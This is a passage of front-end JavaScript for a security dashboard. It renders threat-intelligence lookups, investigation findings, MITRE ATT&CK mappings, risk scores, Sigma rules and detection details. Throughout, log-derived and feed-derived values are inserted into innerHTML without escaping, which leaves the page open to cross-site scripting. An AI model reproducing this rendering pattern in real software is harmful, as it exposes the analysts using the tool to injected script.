    const vt = ioc.virusTotal || {};
    const ab = ioc.abuseIPDB  || {};
    const otx = ioc.otx       || {};
    const isClean = !ioc.malicious && (vt.positives||0) === 0;

    container.innerHTML = `
<div class="rk-card" style="overflow:hidden;">
  <div class="rk-card-hdr" style="background:${ioc.malicious ? 'rgba(239,68,68,.06)' : 'rgba(34,197,94,.04)'};">
    <div>
      <div style="font-size:13px;font-weight:700;color:#e6edf3;">${ioc.value || ioc.indicator || 'IOC Result'}</div>
      <div style="font-size:11px;color:#6b7280;margin-top:2px;">${ioc.type || 'indicator'}</div>
    </div>
    <span class="rk-badge" style="background:${isClean ? 'rgba(34,197,94,.12)' : 'rgba(239,68,68,.12)'};color:${isClean ? '#34d399' : '#ef4444'};">
      ${isClean ? '✓ Clean' : '⚠ Malicious'}
    </span>
  </div>
  <div style="padding:16px;">
    <div class="rk-grid-3" style="margin-bottom:16px;">
      ${_iocStatCard('VirusTotal', `${vt.positives||0}/${vt.total||0}`, '#ef4444')}
      ${_iocStatCard('AbuseIPDB',  `${ab.abuseScore||0}%`, '#f97316')}
      ${_iocStatCard('OTX Pulses', `${otx.pulseCount||0}`, '#a78bfa')}
    </div>
    ${ioc.country ? `<div style="font-size:12px;color:#8b949e;margin-bottom:8px;">Country: <span style="color:#e6edf3;">${ioc.country} ${ioc.asn||''}</span></div>` : ''}
    ${ioc.tags?.length ? `<div style="display:flex;gap:4px;flex-wrap:wrap;margin-bottom:8px;">${ioc.tags.map(t=>`<span class="rk-tag">${t}</span>`).join('')}</div>` : ''}
    ${ioc.description ? `<div style="font-size:12px;color:#8b949e;">${ioc.description}</div>` : ''}
  </div>
</div>`;
  }

  function _iocStatCard(label, val, color) {
    return `<div style="padding:12px;background:#0d1117;border-radius:6px;text-align:center;">
  <div style="font-size:18px;font-weight:700;color:${color};">${val}</div>
  <div style="font-size:10px;color:#6b7280;margin-top:2px;">${label}</div>
</div>`;
  }

  function _renderBatchIOC(results, container) {
    if (!container) return;
    container.innerHTML = `
<div class="rk-card" style="overflow:hidden;">
  <div class="rk-card-hdr"><span style="font-size:13px;font-weight:600;">Batch Lookup — ${results.length} IOCs</span></div>
  <table class="rk-table">
    <thead><tr><th>IOC</th><th>Type</th><th>VT Score</th><th>Abuse %</th><th>Verdict</th></tr></thead>
    <tbody>${results.map(r => `
    <tr>
      <td class="rk-code" style="color:#e6edf3;">${r.value||r.indicator||'—'}</td>
      <td><span class="rk-tag">${r.type||'—'}</span></td>
      <td style="color:${(r.virusTotal?.positives||0)>0?'#ef4444':'#34d399'};">${r.virusTotal?.positives||0}/${r.virusTotal?.total||0}</td>
      <td style="color:${(r.abuseIPDB?.abuseScore||0)>50?'#ef4444':'#34d399'};">${r.abuseIPDB?.abuseScore||0}%</td>
      <td>${r.malicious ?
        '<span class="rk-badge" style="background:rgba(239,68,68,.12);color:#ef4444;">⚠ Malicious</span>' :
        '<span class="rk-badge" style="background:rgba(34,197,94,.12);color:#34d399;">✓ Clean</span>'
      }</td>
    </tr>`).join('')}
    </tbody>
  </table>
</div>`;
  }

  // ── Investigation result ─────────────────────────────────────
  // ════════════════════════════════════════════════════════════════
  //  INVESTIGATION RESULT RENDERER  —  Policy-Compliant UI
  //  Tab layout:  Findings | Timeline | MITRE | Risk | Chain
  //  Policy §14: Findings = unique behaviors only
  //  Policy §13: Timeline = attack progression, no duplicates
  //  Policy §17: MITRE = validated techniques only
  //  Policy §15: Risk = deduplicated scoring only
  //  Policy §16: Chain = distinct techniques + progression only
  // ════════════════════════════════════════════════════════════════
  function _renderInvestigationResult(r, container) {
    if (!container) return;
    const score    = r.riskScore || 0;
    const findings = r.findings  || [];
    const timeline = r.timeline  || [];
    const mitreTechs = r.mitreMap?.techniques || [];
    const chain    = r.chain;
    const meta     = r._meta || {};

    // ── Helper: severity → color ─────────────────────────────
    const sevColor = s => ({critical:'#ef4444',high:'#f97316',medium:'#eab308',low:'#22c55e',informational:'#6b7280'}[s]||'#6b7280');
    const confColor = c => ({HIGH:'#22c55e',MEDIUM:'#eab308',LOW:'#6b7280'}[c]||'#6b7280');
    const domainIcon = d => ({endpoint:'🖥',network:'🌐',database:'🗄',cloud:'☁️',application:'⚡'}[d]||'⬡');
    const typeIcon   = t => ({host:'🖥',user:'👤',ip:'🌐',hash:'🔑',process:'⚙️',cloud_resource:'☁️'}[t]||'🕵️');
    const srcLabel   = s => ({ hybrid:'Hybrid (Client + Backend)', client:'Client-Side Only', backend:'Backend Only', empty:'No Data' }[s]||s||'Unknown');

    // ── Domain summary pills ─────────────────────────────────
    const domSummaryPills = Object.entries(r.domainSummary||{})
      .map(([d,n]) => `<span class="rk-inv-domain-pill rk-domain-${d}">${domainIcon(d)} ${d} <b>${n}</b></span>`)
      .join('');

    // ── Risk tier label ─────────────────────────────────────
    const riskTier  = score >= 80 ? {l:'CRITICAL',c:'#ef4444'} :
                      score >= 60 ? {l:'HIGH',c:'#f97316'}    :
                      score >= 40 ? {l:'MEDIUM',c:'#eab308'}  :
                      score >   0 ? {l:'LOW',c:'#22c55e'}     :
                                    {l:'CLEAN',c:'#6b7280'};

    // ── Findings tab: unique behaviors (Policy §14) ──────────
    const findingsHTML = findings.length ? findings.map((f, i) => {
      const ev = f.evidenceBlock || {};
      const confLvl  = f.confidence?.level || 'LOW';
      const knownTool = f._knownTool ? `<span class="rk-inv-tag rk-inv-tag-tool">⚡ Known Tool</span>` : '';
      const failSafe  = f._failSafe  ? `<span class="rk-inv-tag rk-inv-tag-failsafe">⚠ Fail-Safe</span>` : '';
      const evidFields = (ev.fields_present||[]).map(fp =>
        `<span class="rk-inv-ev-field">${fp}</span>`).join('');
      return `
<div class="rk-inv-finding" data-sev="${f.severity||'low'}">
  <div class="rk-inv-finding-header">
    <div class="rk-inv-finding-sev" style="background:${sevColor(f.severity)};"></div>
    <div class="rk-inv-finding-meta">
      <span class="rk-inv-finding-id">${f.ruleId}</span>
      <span class="rk-inv-finding-name">${f.ruleName}</span>
      ${knownTool}${failSafe}
    </div>
    <div class="rk-inv-finding-badges">
      <span class="rk-inv-sev-badge" style="color:${sevColor(f.severity)};border-color:${sevColor(f.severity)}22;">${(f.severity||'low').toUpperCase()}</span>
      <span class="rk-inv-conf-badge" style="color:${confColor(confLvl)};border-color:${confColor(confLvl)}22;">${confLvl}</span>
      <span class="rk-inv-domain-badge rk-domain-${f.source_type}">${domainIcon(f.source_type)} ${f.source_type}</span>
    </div>
  </div>
  <div class="rk-inv-finding-body">
    <div class="rk-inv-narrative">${f.narrative||'—'}</div>
    <div class="rk-inv-finding-detail">
      ${f.technique ? `<span class="rk-inv-tag rk-inv-tag-mitre">${f.technique}</span>` : `<span class="rk-inv-tag rk-inv-tag-null">Technique: NULL</span>`}
      ${f.tactic    ? `<span class="rk-inv-tag rk-inv-tag-tactic">${f.tactic}</span>` : ''}
      ${f.actor     ? `<span class="rk-inv-tag">Actor: ${f.actor}</span>` : ''}
      ${f.actor_host? `<span class="rk-inv-tag">Host: ${f.actor_host}</span>` : ''}
      ${f.actor_ip  ? `<span class="rk-inv-tag">IP: ${f.actor_ip}</span>` : ''}
      ${f.matchedCount > 1 ? `<span class="rk-inv-tag">Events: ${f.matchedCount}</span>` : ''}
    </div>
    ${evidFields ? `<div class="rk-inv-ev-fields"><span class="rk-inv-ev-label">Evidence fields:</span>${evidFields}</div>` : ''}
  </div>
</div>`;
    }).join('') : `<div class="rk-inv-no-data">
      <span class="rk-inv-no-data-icon">✓</span>
      <div>No behavioral findings for this entity in current session data.</div>
      <div class="rk-inv-no-data-sub">Ensure log data has been ingested before investigation.</div>
    </div>`;

    // ── Timeline tab: attack progression (Policy §13) ────────
    const tlDomainColor = {endpoint:'#00d4ff',network:'#3b82f6',database:'#f97316',cloud:'#a78bfa',application:'#22c55e'};
    const timelineHTML = timeline.length ? `
<div class="rk-inv-timeline">
  ${timeline.slice(0, 50).map((e, i) => {
    const col = tlDomainColor[e.source_type] || '#6b7280';
    return `
<div class="rk-inv-tl-item">
  <div class="rk-inv-tl-line" style="border-color:${col}33;"></div>
  <div class="rk-inv-tl-dot" style="background:${col};box-shadow:0 0 6px ${col}66;"></div>
  <div class="rk-inv-tl-content">
    <div class="rk-inv-tl-header">
      <span class="rk-inv-tl-type" style="color:${col};">${domainIcon(e.source_type)} ${(e.source_type||'').toUpperCase()}</span>
      <span class="rk-inv-tl-evtype">${(e.event_type||'event').replace(/_/g,' ')}</span>
      <span class="rk-inv-tl-ts">${_fmt(e.timestamp)}</span>
    </div>
    <div class="rk-inv-tl-desc">${e.description||'—'}</div>
    ${e.actor     ? `<span class="rk-inv-tag">👤 ${e.actor}</span>` : ''}
    ${e.actor_host? `<span class="rk-inv-tag">🖥 ${e.actor_host}</span>` : ''}
    ${e.actor_ip  ? `<span class="rk-inv-tag">🌐 ${e.actor_ip}</span>` : ''}
    ${e.action    ? `<span class="rk-inv-tag rk-inv-tag-action">${e.action.slice(0,60)}</span>` : ''}
  </div>
</div>`;
  }).join('')}
</div>` : `<div class="rk-inv-no-data">
  <span class="rk-inv-no-data-icon">⏱</span>
  <div>No timeline events for this entity.</div>
</div>`;

    // ── MITRE tab: validated techniques only (Policy §17) ────
    const TACTIC_ORDER = ['reconnaissance','initial-access','execution','persistence',
      'privilege-escalation','defense-evasion','credential-access','discovery',
      'lateral-movement','collection','command-and-control','exfiltration','impact'];
    const byTactic = {};
    mitreTechs.forEach(t => {
      const tac = t.tactic || 'unknown';
      if (!byTactic[tac]) byTactic[tac] = [];
      byTactic[tac].push(t);
    });
    const mitreHTML = mitreTechs.length ? `
<div class="rk-inv-mitre">
  ${TACTIC_ORDER.filter(tac => byTactic[tac]).map(tac => `
  <div class="rk-inv-mitre-group">
    <div class="rk-inv-mitre-tactic">${tac.replace(/-/g,' ').replace(/\b\w/g,c=>c.toUpperCase())}</div>
    <div class="rk-inv-mitre-techs">
      ${byTactic[tac].map(t => `
      <div class="rk-inv-mitre-card" style="border-color:${confColor(t.confidence)}33;">
        <div class="rk-inv-mitre-tid">${t.technique}</div>
        <div class="rk-inv-mitre-tname">${t.name||'—'}</div>
        <div class="rk-inv-mitre-foot">
          <span class="rk-inv-tag rk-inv-tag-conf" style="color:${confColor(t.confidence)};">${t.confidence}</span>
          <span class="rk-inv-domain-badge rk-domain-${t.source_type}">${domainIcon(t.source_type)} ${t.source_type||'?'}</span>
        </div>
      </div>`).join('')}
    </div>
  </div>`).join('')}
  ${Object.keys(byTactic).filter(t=>!TACTIC_ORDER.includes(t)).map(tac => `
  <div class="rk-inv-mitre-group">
    <div class="rk-inv-mitre-tactic">${tac}</div>
    <div class="rk-inv-mitre-techs">
      ${byTactic[tac].map(t => `
      <div class="rk-inv-mitre-card">
        <div class="rk-inv-mitre-tid">${t.technique}</div>
        <div class="rk-inv-mitre-tname">${t.name||'—'}</div>
      </div>`).join('')}
    </div>
  </div>`).join('')}
</div>` : `<div class="rk-inv-no-data">
  <span class="rk-inv-no-data-icon">🗺</span>
  <div>No validated MITRE techniques.</div>
  <div class="rk-inv-no-data-sub">Techniques are only assigned after full context validation (Policy §8).</div>
</div>`;

    // ── Risk tab: deduplicated scoring (Policy §15) ──────────
    const riskHTML = `
<div class="rk-inv-risk">
  <div class="rk-inv-risk-gauge">
    <svg viewBox="0 0 200 110" width="200" height="110">
      <defs>
        <linearGradient id="riskGrad-inv" x1="0" y1="0" x2="1" y2="0">
          <stop offset="0%"   stop-color="#22c55e"/>
          <stop offset="40%"  stop-color="#eab308"/>
          <stop offset="70%"  stop-color="#f97316"/>
          <stop offset="100%" stop-color="#ef4444"/>
        </linearGradient>
      </defs>
      <path d="M 20 100 A 80 80 0 0 1 180 100" fill="none" stroke="rgba(255,255,255,0.06)" stroke-width="16" stroke-linecap="round"/>
      <path d="M 20 100 A 80 80 0 0 1 180 100" fill="none" stroke="url(#riskGrad-inv)" stroke-width="16" stroke-linecap="round"
        stroke-dasharray="${score * 2.51} 251" opacity="0.9"/>
      <text x="100" y="85" text-anchor="middle" font-size="32" font-weight="800" fill="${riskTier.c}" font-family="JetBrains Mono,monospace">${score}</text>
      <text x="100" y="105" text-anchor="middle" font-size="10" fill="${riskTier.c}" letter-spacing="2">${riskTier.l}</text>
    </svg>
  </div>
  <div class="rk-inv-risk-breakdown">
    <div class="rk-inv-risk-title">Deduplicated Risk Breakdown <span class="rk-inv-tag">Policy §15</span></div>
    ${findings.map(f => {
      const SEV = {critical:30,high:20,medium:10,low:5};
      const CONF = {HIGH:1.0,MEDIUM:0.7,LOW:0.4};
      const s = SEV[f.severity]||5;
      const c = CONF[f.confidence?.level]||0.5;
      const corr = Math.min(((f.evidenceBlock?.fields_present?.length||1)*0.1),0.5);
      const contrib = Math.round(s * c * (1 + corr));
      const pct = score > 0 ? Math.round((contrib / score) * 100) : 0;
      return `
<div class="rk-inv-risk-row">
  <div class="rk-inv-risk-row-name">${f.ruleName}</div>
  <div class="rk-inv-risk-bar-wrap">
    <div class="rk-inv-risk-bar" style="width:${Math.min(pct,100)}%;background:${sevColor(f.severity)};"></div>
  </div>
  <div class="rk-inv-risk-row-score" style="color:${sevColor(f.severity)};">+${contrib}</div>
</div>`;
    }).join('')}
    <div class="rk-inv-risk-meta">
      <span>Events analyzed: <b>${meta.eventsAnalyzed||r.totalEvents||0}</b></span>
      <span>Normalized: <b>${meta.normEvents||0}</b></span>
      <span>Raw findings: <b>${meta.rawFindingsCount||0}</b></span>
      <span>Deduped: <b>${meta.dedupedCount||findings.length}</b></span>
      <span>Source: <b>${srcLabel(r._source)}</b></span>
    </div>
  </div>
</div>`;

    // ── Chain tab: distinct techniques + progression (Policy §16) ─
    const chainHTML = chain ? `
<div class="rk-inv-chain-wrap">
  <div class="rk-inv-chain-meta">
    <span class="rk-inv-tag">Techniques: ${chain.techniques?.length||0} distinct</span>
    <span class="rk-inv-tag">Stages: ${chain.stages?.length||0}</span>
    <span class="rk-inv-tag rk-inv-tag-domain">${chain.source_type||'?'}</span>
    <span class="rk-inv-sev-badge" style="color:${sevColor(chain.severity)};border-color:${sevColor(chain.severity)}22;">${(chain.severity||'?').toUpperCase()}</span>
  </div>
  <div class="rk-inv-chain">
    ${(chain.stages||[]).map((st, i) => `
    <div class="rk-inv-chain-stage">
      <div class="rk-inv-chain-node" style="border-color:${sevColor(st.severity)}55;box-shadow:0 0 12px ${sevColor(st.severity)}22;">
        <div class="rk-inv-chain-idx">${i+1}</div>
        <div class="rk-inv-chain-tactic">${(st.tactic||'?').replace(/-/g,' ')}</div>
        <div class="rk-inv-chain-tech">${st.technique||'NULL'}</div>
        <div class="rk-inv-chain-name">${st.ruleName||'—'}</div>
        <div class="rk-inv-chain-meta2">
          <span style="color:${sevColor(st.severity)};">${(st.severity||'?').toUpperCase()}</span>
          <span style="color:${confColor(st.confidence>=80?'HIGH':st.confidence>=50?'MEDIUM':'LOW')};">${st.confidence||0}%</span>
        </div>
        ${st.actor_host ? `<div class="rk-inv-chain-host">🖥 ${st.actor_host}</div>` : ''}
      </div>
      ${i < (chain.stages||[]).length-1 ? '<div class="rk-inv-chain-arrow">→</div>' : ''}
    </div>`).join('')}
  </div>
</div>` : `<div class="rk-inv-no-data">
  <span class="rk-inv-no-data-icon">🔗</span>
  <div>No attack chain formed.</div>
  <div class="rk-inv-no-data-sub">Chains form only when ≥2 distinct techniques with clear kill-chain progression exist (Policy §16).</div>
</div>`;

    // ── Tab counts ───────────────────────────────────────────
    const tabId = 'rk-inv-tabs-' + Date.now().toString(36);

    container.innerHTML = `
<div class="rk-inv-result-root">

  <!-- ══ ENTITY HEADER ══════════════════════════════════════════ -->
  <div class="rk-inv-entity-header">
    <div class="rk-inv-entity-icon">${typeIcon(r.type)}</div>
    <div class="rk-inv-entity-info">
      <div class="rk-inv-entity-id">${r.entityId}</div>
      <div class="rk-inv-entity-meta">
        <span class="rk-inv-type-badge">${r.type||'auto'}</span>
        ${domSummaryPills}
        <span class="rk-inv-src-badge">⬡ ${srcLabel(r._source)}</span>
      </div>
      ${r.summary ? `<div class="rk-inv-entity-summary">${r.summary}</div>` : ''}
    </div>
    <div class="rk-inv-entity-risk">
      <div class="rk-inv-entity-risk-score" style="color:${riskTier.c};">${score}</div>
      <div class="rk-inv-entity-risk-tier" style="color:${riskTier.c};">${riskTier.l}</div>
      <div class="rk-inv-entity-risk-label">Risk Score</div>
    </div>
  </div>

  <!-- ══ TABS ════════════════════════════════════════════════════ -->
  <div class="rk-inv-tabs" id="${tabId}">
    <button class="rk-inv-tab rk-inv-tab-active" onclick="window._rkInvTab('${tabId}','findings',this)">
      ⬡ Findings <span class="rk-inv-tab-badge">${findings.length}</span>
    </button>
    <button class="rk-inv-tab" onclick="window._rkInvTab('${tabId}','timeline',this)">
      ⏱ Timeline <span class="rk-inv-tab-badge">${timeline.length}</span>
    </button>
    <button class="rk-inv-tab" onclick="window._rkInvTab('${tabId}','mitre',this)">
      🗺 MITRE <span class="rk-inv-tab-badge">${mitreTechs.length}</span>
    </button>
    <button class="rk-inv-tab" onclick="window._rkInvTab('${tabId}','risk',this)">
      📊 Risk Score
    </button>
    <button class="rk-inv-tab" onclick="window._rkInvTab('${tabId}','chain',this)">
      🔗 Attack Chain ${chain ? '<span class="rk-inv-tab-badge rk-tab-badge-chain">'+chain.stages?.length+'</span>' : ''}
    </button>
  </div>

  <!-- ══ TAB PANELS ══════════════════════════════════════════════ -->
  <div class="rk-inv-tab-panels">
    <div class="rk-inv-panel rk-inv-panel-active" data-panel="${tabId}-findings">
      <div class="rk-inv-panel-hdr">
        <span>Unique Behavioral Findings</span>
        <span class="rk-inv-tag">Policy §14 — One behavior = one detection</span>
        <span class="rk-inv-tag">§6 Dedup Gate applied</span>
      </div>
      <div class="rk-inv-findings-list">${findingsHTML}</div>
    </div>
    <div class="rk-inv-panel" data-panel="${tabId}-timeline">
      <div class="rk-inv-panel-hdr">
        <span>Attack Progression Timeline</span>
        <span class="rk-inv-tag">Policy §13 — No duplicate events</span>
      </div>
      ${timelineHTML}
    </div>
    <div class="rk-inv-panel" data-panel="${tabId}-mitre">
      <div class="rk-inv-panel-hdr">
        <span>Validated MITRE ATT&amp;CK Techniques</span>
        <span class="rk-inv-tag">Policy §8 — Context-before-technique</span>
        <span class="rk-inv-tag">NULL if context insufficient</span>
      </div>
      ${mitreHTML}
    </div>
    <div class="rk-inv-panel" data-panel="${tabId}-risk">
      <div class="rk-inv-panel-hdr">
        <span>Deduplicated Risk Scoring</span>
        <span class="rk-inv-tag">Policy §15 — Never inflated by duplicates</span>
      </div>
      ${riskHTML}
    </div>
    <div class="rk-inv-panel" data-panel="${tabId}-chain">
      <div class="rk-inv-panel-hdr">
        <span>Behavior Attack Chain</span>
        <span class="rk-inv-tag">Policy §16 — Distinct techniques + progression only</span>
      </div>
      ${chainHTML}
    </div>
  </div>

</div>`;

    // ── Tab switching logic ──────────────────────────────────
    window._rkInvTab = function(tid, panel, btn) {
      const root = document.getElementById(tid)?.closest('.rk-inv-result-root');
      if (!root) return;
      root.querySelectorAll('.rk-inv-tab').forEach(t => t.classList.remove('rk-inv-tab-active'));
      root.querySelectorAll('.rk-inv-panel').forEach(p => p.classList.remove('rk-inv-panel-active'));
      if (btn) btn.classList.add('rk-inv-tab-active');
      const pEl = root.querySelector(`[data-panel="${tid}-${panel}"]`);
      if (pEl) pEl.classList.add('rk-inv-panel-active');
    };
  }

  // ── Rules list ───────────────────────────────────────────────
  async function _loadRules() {
    const sev  = document.getElementById('rk-rules-sev')?.value   || '';
    const srch = document.getElementById('rk-rules-search')?.value || '';
    const el   = document.getElementById('rk-rules-list');
    if (!el) return;
    el.innerHTML = `<div style="padding:40px;text-align:center;">${_spinner('Loading rules…')}</div>`;
    try {
      const r = await _api('GET', `/rules?severity=${sev}&limit=200`);
      const rules = (r.rules||[]).filter(ru => !srch || ru.name?.toLowerCase().includes(srch.toLowerCase()) || ru.description?.toLowerCase().includes(srch.toLowerCase()));
      const cnt = document.getElementById('rk-rules-cnt');
      if (cnt) cnt.textContent = r.total || rules.length;
      if (!rules.length) {
        el.innerHTML = `<div style="padding:40px;text-align:center;color:#4b5563;font-size:13px;">No rules found.</div>`;
        return;
      }
      el.innerHTML = `<table class="rk-table">
  <thead><tr><th>Severity</th><th>Rule Name</th><th>MITRE Technique</th><th>Category</th><th>Status</th></tr></thead>
  <tbody>${rules.map(ru => `
  <tr>
    <td>${_sevBadge(ru.level||ru.severity||'medium')}</td>
    <td style="font-weight:600;color:#e6edf3;">${ru.name||ru.title||'—'}</td>
    <td><span class="rk-tag" style="color:#a78bfa;">${ru.tags?.find(t=>t.startsWith('attack.t'))||'—'}</span></td>
    <td><span class="rk-tag">${ru.category||ru.logsource?.category||'—'}</span></td>
    <td><span class="rk-badge" style="background:rgba(34,197,94,.12);color:#34d399;">✓ Active</span></td>
  </tr>`).join('')}
  </tbody>
</table>`;
    } catch(e) {
      el.innerHTML = `<div style="color:#ef4444;padding:20px;">${e.message}</div>`;
    }
  }

  function _searchRules() {
    clearTimeout(window._rk_rulesearchTimer);
    window._rk_rulesearchTimer = setTimeout(_loadRules, 300);
  }

  // ── MITRE heatmap ────────────────────────────────────────────
  async function _loadMITRE() {
    const el = document.getElementById('rk-mitre-heatmap');
    if (!el) return;
    el.innerHTML = `<div style="padding:40px;text-align:center;">${_spinner('Loading MITRE coverage…')}</div>`;
    try {
      const r = await _api('GET', '/mitre');
      _renderMITREHeatmap(r, el);
    } catch(e) {
      el.innerHTML = `<div style="color:#ef4444;padding:20px;">${e.message}</div>`;
    }
  }

  function _renderMITREHeatmap(r, el) {
    const tactics = r.tactics || [];
    const covered = r.coveredTechniques || {};

    if (!tactics.length) {
      el.innerHTML = `<div style="color:#4b5563;font-size:13px;text-align:center;padding:40px;">No MITRE data available.</div>`;
      return;
    }

    el.innerHTML = `
<div>
  <div style="display:flex;gap:12px;margin-bottom:16px;flex-wrap:wrap;align-items:center;">
    <div style="font-size:12px;color:#8b949e;">
      Coverage: <span style="color:#34d399;font-weight:700;">${r.coverage?.toFixed(1)||0}%</span>
      · ${Object.keys(covered).length} techniques covered
    </div>
    <div style="display:flex;gap:6px;">
      <span style="font-size:10px;padding:2px 8px;border-radius:4px;background:#ef444433;color:#ef4444;">Detected</span>
      <span style="font-size:10px;padding:2px 8px;border-radius:4px;background:#34d39933;color:#34d399;">Rule Coverage</span>
      <span style="font-size:10px;padding:2px 8px;border-radius:4px;background:#21262d;color:#6b7280;">No Coverage</span>
    </div>
  </div>
  <div style="overflow-x:auto;">
    <div style="display:flex;gap:8px;min-width:900px;">
      ${tactics.map(tactic => `
      <div style="flex:1;min-width:100px;">
        <div style="font-size:9px;font-weight:800;text-transform:uppercase;color:${TACTIC_COLOR[tactic.id]||'#8b949e'};
          padding:6px 4px;background:${TACTIC_COLOR[tactic.id]||'#8b949e'}1a;border-radius:4px;
          text-align:center;margin-bottom:4px;letter-spacing:.3px;">${tactic.name||tactic.id}</div>
        ${(tactic.techniques||[]).map(t => {
          const det = covered[t.id]?.detected;
          const cov = covered[t.id]?.rules > 0;
          const bg  = det ? '#ef444433' : cov ? '#34d39922' : '#21262d';
          const col = det ? '#ef4444'   : cov ? '#34d399'   : '#4b5563';
          return `<div class="rk-mitre-cell" style="background:${bg};color:${col};margin-bottom:2px;"
            title="${t.id}: ${t.name}">${t.id}</div>`;
        }).join('')}
      </div>`).join('')}
    </div>
  </div>
</div>`;
  }

  // ── Generated rule ───────────────────────────────────────────
  function _renderGeneratedRule(rule, validation, container) {
    if (!container) return;
    const isValid = validation?.valid !== false;
    container.innerHTML = `
<div class="rk-card" style="overflow:hidden;">
  <div class="rk-card-hdr" style="background:rgba(124,58,237,.06);">
    <div>
      <div style="font-size:13px;font-weight:600;">✨ Generated Sigma Rule</div>
      <div style="font-size:11px;color:#6b7280;margin-top:2px;">${rule?.title||rule?.name||'Detection Rule'}</div>
    </div>
    <div style="display:flex;gap:8px;align-items:center;">
      <span class="rk-badge" style="background:${isValid?'rgba(34,197,94,.12)':'rgba(249,115,22,.12)'};color:${isValid?'#34d399':'#f97316'};">
        ${isValid ? '✅ Valid' : '⚠️ Needs Review'}
      </span>
      <button class="rk-btn rk-btn-ghost" style="font-size:11px;" onclick="navigator.clipboard.writeText(JSON.stringify(${JSON.stringify(JSON.stringify(rule))},null,2))">Copy</button>
    </div>
  </div>
  <div style="padding:16px;">
    <pre class="rk-code" style="
      background:#0d1117;border-radius:8px;padding:16px;overflow-x:auto;
      font-size:11px;color:#8b949e;border:1px solid #21262d;max-height:400px;overflow-y:auto;
    ">${JSON.stringify(rule, null, 2)}</pre>
    ${validation?.errors?.length ? `
    <div style="margin-top:10px;padding:10px;background:rgba(249,115,22,.08);border-radius:6px;border:1px solid rgba(249,115,22,.2);">
      <div style="color:#f97316;font-size:12px;font-weight:600;margin-bottom:4px;">Validation Errors:</div>
      ${validation.errors.map(e => `<div style="font-size:11px;color:#8b949e;">• ${e}</div>`).join('')}
    </div>` : ''}
    <div style="margin-top:12px;display:flex;gap:8px;">
      ${isValid ? `<button class="rk-btn rk-btn-primary" style="font-size:11px;" onclick="RAYKAN_UI._activateGeneratedRule()">
        ✓ Add to Engine
      </button>` : ''}
      <button class="rk-btn rk-btn-ghost" style="font-size:11px;" onclick="RAYKAN_UI._setTab('rules')">View All Rules →</button>
    </div>
  </div>
</div>`;
    window._rk_lastGeneratedRule = rule;
  }

  async function _activateGeneratedRule() {
    if (!window._rk_lastGeneratedRule) return;
    _showToast('Rule added to active engine', 'success');
  }

  // ── Detection detail modal (aggregated view) ─────────────────
  function _showDetDetail(id) {
    const det = S.detections.find(d => d.id === id) || S.detections[0];
    if (!det) return;

    // Normalize MITRE field — CSDE uses det.mitre as object, backend may use array
    const mitreItems = Array.isArray(det.mitre) ? det.mitre
      : (det.mitre && typeof det.mitre === 'object' ? [det.mitre] : []);
    const mitreText = mitreItems.length
      ? mitreItems.map(t => `<span class="rk-tag" style="color:#a78bfa;">${t.id||t.technique||''} — ${t.name||''} <span style="color:#6b7280;">[${t.tactic||''}]</span></span>`).join('')
      : (det.technique ? `<span class="rk-tag" style="color:#a78bfa;">${det.technique}</span>` : '');

    // Aggregation info
    const isAgg   = !!(det.variants_triggered && det.variants_triggered.length);
    const eCount  = det.event_count || (det.evidence ? det.evidence.length : 1);
    const vCount  = det.variants_triggered ? det.variants_triggered.length : 1;
    const conf    = det.confidence_score || 30;
    const sev     = det.aggregated_severity || det.severity || 'medium';
    const confColor = conf >= 80 ? '#ef4444' : conf >= 60 ? '#f97316' : conf >= 40 ? '#eab308' : '#6b7280';

    // Collect all raw evidence events across raw_detections
    const allEvidence = [];
    if (det.raw_detections && det.raw_detections.length) {
      det.raw_detections.forEach(rd => {
        (rd.evidence || []).forEach(ev => allEvidence.push(ev));
      });
    } else if (det.evidence) {
      det.evidence.forEach(ev => allEvidence.push(ev));
    }

    const overlay = document.createElement('div');
    overlay.className = 'rk-modal-overlay';
    overlay.onclick = (e) => { if (e.target === overlay) overlay.remove(); };
    overlay.innerHTML = `
<div class="rk-modal">
  <div class="rk-card-hdr" style="padding:16px 20px;flex-shrink:0;">
    <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
      ${_sevBadge(sev)}
      <span style="font-size:14px;font-weight:700;color:#e6edf3;">${det.detection_name||det.ruleName||det.title||'Detection'}</span>
      ${isAgg ? `<span style="font-size:10px;padding:2px 8px;background:rgba(96,165,250,0.12);color:#60a5fa;border-radius:10px;">AGGREGATED</span>` : ''}
    </div>
    <button onclick="this.closest('.rk-modal-overlay').remove()" style="background:none;border:none;color:#6b7280;font-size:18px;cursor:pointer;padding:4px;">✕</button>
  </div>
  <div style="overflow-y:auto;padding:20px;flex:1;">

    ${isAgg ? `
    <!-- Aggregation summary banner -->
    <div style="margin-bottom:16px;padding:12px 16px;background:rgba(96,165,250,0.06);border:1px solid rgba(96,165,250,0.15);border-radius:8px;">
      <div style="font-size:11px;color:#60a5fa;font-weight:700;text-transform:uppercase;letter-spacing:.4px;margin-bottom:8px;">Deduplication Summary</div>
      <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px;">
        <div style="text-align:center;padding:8px;background:#0d1117;border-radius:6px;">
          <div style="font-size:20px;font-weight:800;color:#60a5fa;">${eCount}</div>
          <div style="font-size:10px;color:#6b7280;margin-top:2px;">Events Matched</div>
        </div>
        <div style="text-align:center;padding:8px;background:#0d1117;border-radius:6px;">
          <div style="font-size:20px;font-weight:800;color:#a78bfa;">${vCount}</div>
          <div style="font-size:10px;color:#6b7280;margin-top:2px;">Variants Triggered</div>
        </div>
        <div style="text-align:center;padding:8px;background:#0d1117;border-radius:6px;">
          <div style="font-size:20px;font-weight:800;color:${confColor};">${conf}%</div>
          <div style="font-size:10px;color:#6b7280;margin-top:2px;">Confidence</div>
        </div>
      </div>
      ${det.first_seen !== det.last_seen && det.last_seen ? `
      <div style="margin-top:8px;font-size:11px;color:#6b7280;">
        <span style="color:#4b5563;">First seen:</span> ${_fmt(det.first_seen)}
        &nbsp;→&nbsp;
        <span style="color:#4b5563;">Last seen:</span> ${_fmt(det.last_seen)}
      </div>` : ''}
    </div>` : ''}

    <div class="rk-grid-2" style="margin-bottom:16px;">
      ${_detField('Host',       det.computer||det.host)}
      ${_detField('User',       det.user)}
      ${_detField('Source IP',  det.srcIp||det.src_ip||'—')}
      ${_detField('Process',    det.process||det.processName)}
      ${_detField('Risk Score', det.riskScore ? det.riskScore+'/100' : '—')}
      ${_detField('Category',   det.category || '—')}
    </div>

    ${det.narrative||det.description ? `<div style="margin-bottom:14px;padding:12px;background:rgba(96,165,250,0.06);border-left:3px solid #60a5fa;border-radius:0 6px 6px 0;">
